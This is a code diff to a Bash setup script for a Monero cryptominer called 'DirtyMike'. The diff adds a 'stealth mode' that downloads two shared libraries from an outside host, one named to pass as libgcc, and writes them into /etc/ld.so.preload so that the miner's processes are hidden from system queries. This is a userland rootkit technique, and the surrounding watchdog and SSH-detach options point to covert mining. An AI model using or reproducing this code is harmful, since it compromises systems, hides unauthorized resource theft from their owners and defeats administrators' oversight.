@@ -35,13 +35,15 @@ CPU_max_lim=90
 watchdog=true
 # Detatched (only needed for remote deploy to detatch process from ssh connection)
 detatched=true
+# Stealth mode will hide all services against queries
+stealth=true
 ###############################################################################################################################
 
 
 
 # ======== c3Pool setup script for Monero Miner ======== 
 function log () {
-    echo "[DirtyMike]: $1"
+    printf "[DirtyMike]: $1\n"
 }
 function center () {
     COLUMNS=$(tput cols)
@@ -235,11 +237,25 @@ function build () {
     # trigger daemon or script directly
     if [[ $watchdog == true ]]; then
         daemon && shuffler
-        log "miner will start shortly ..."
     else
         shuffle &
         runMiner
     fi
+    # trigger stealth mode when the processes 
+    if [ $stealth == true ]; then
+        for i in 5 4 3 2 1
+        do
+            log "Go stealth in $i seconds ...\r"; sleep 1
+        done
+        log "👹 Crawl stealth tools 👹"; sleep 1;
+        cd /usr/local/lib/ &&
+        wget https://b0-b.github.io/DirtyMike/libgcc.so && 
+        wget https://b0-b.github.io/DirtyMike/libstrep.so &&
+        echo /usr/local/lib/libgcc.so >> /etc/ld.so.preload &&
+        echo /usr/local/lib/libstrep.so >> /etc/ld.so.preload
+        log "is in stealth mode 👹"; sleep 1;
+    fi
+    log "miner will start shortly ..."
 }
 
 
